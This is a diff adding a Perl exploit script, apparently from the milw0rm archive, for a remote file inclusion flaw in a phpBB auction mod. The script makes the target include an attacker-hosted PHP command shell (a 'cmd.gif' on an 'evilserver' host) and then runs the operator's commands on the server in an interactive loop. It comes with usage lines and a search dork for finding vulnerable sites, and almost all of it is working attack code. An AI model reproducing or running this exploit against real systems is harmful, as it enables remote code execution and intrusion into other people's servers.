@@ -1,0 +1,76 @@
+#!/usr/bin/perl
+##
+#phpBB auction mod - Remote File Inclusion Vuln
+# Bug discovered by VietMafia
+# code copier: webDEViL w3bd3vil[at]gmail.com
+#code same as Fast Click <= 2.3.8 Remote File Inclusion exploit
+# dork: intext:"phpbb - auction" inurl:"auction"
+# usage:
+# perl wb1.pl <target> <cmd shell location> <cmd shell variable>
+# perl wb1.pl http://vulnerable.com/ http://target.com/cmd.gif cmd
+# cmd shell example: <?system($cmd);?>
+# cmd shell variable: ($_GET[cmd]);
+
+use LWP::UserAgent;
+
+$Path = $ARGV[0];
+$Pathtocmd = $ARGV[1];
+$cmdv = $ARGV[2];
+
+if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}
+
+head();
+
+while()
+{
+      print "[shell] \$";
+while(<STDIN>)
+      {
+              $cmd=$_;
+              chomp($cmd);
+
+$xpl = LWP::UserAgent->new() or die;
+$req = HTTP::Request->new(GET =>$Path.'/auction/auction_common.php?phpbb_root_path='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n"; 
+
+
+$res = $xpl->request($req);
+$return = $res->content;
+$return =~ tr/[\n]/[ê]/;
+
+if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}
+
+elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
+      {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
+elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
+
+if($return =~ /(.*)/)
+
+{
+      $finreturn = $1;
+      $finreturn=~ tr/[ê]/[\n]/;
+      print "\r\n$finreturn\n\r";
+      last;
+}
+
+else {print "[shell] \$";}}}last;
+
+sub head()
+ {
+ print "\n============================================================================\r\n";
+ print "  phpBB auction mod - Remote File Inclusion Vuln\r\n";
+ print "============================================================================\r\n";
+ }
+sub usage()
+ {
+ head();
+ print " Usage: perl wb1.pl <target> <cmd shell location> <cmd shell variable>\r\n\n";
+ print " <Site> - Full path to phpBB auction ex: http://www.site.com/ or http://www.site.com/phpbb/ \r\n";
+ print " <cmd shell> - Path to cmd Shell e.g http://evilserver/cmd.gif \r\n";
+ print " <cmd variable> - Command variable used in php shell \r\n";
+ print "============================================================================\r\n";
+ print "                          webDEViL w3bd3vil[at]gmail.com \r\n";
+ print "============================================================================\r\n";
+ exit();
+ }
+
+# milw0rm.com [2006-05-04]
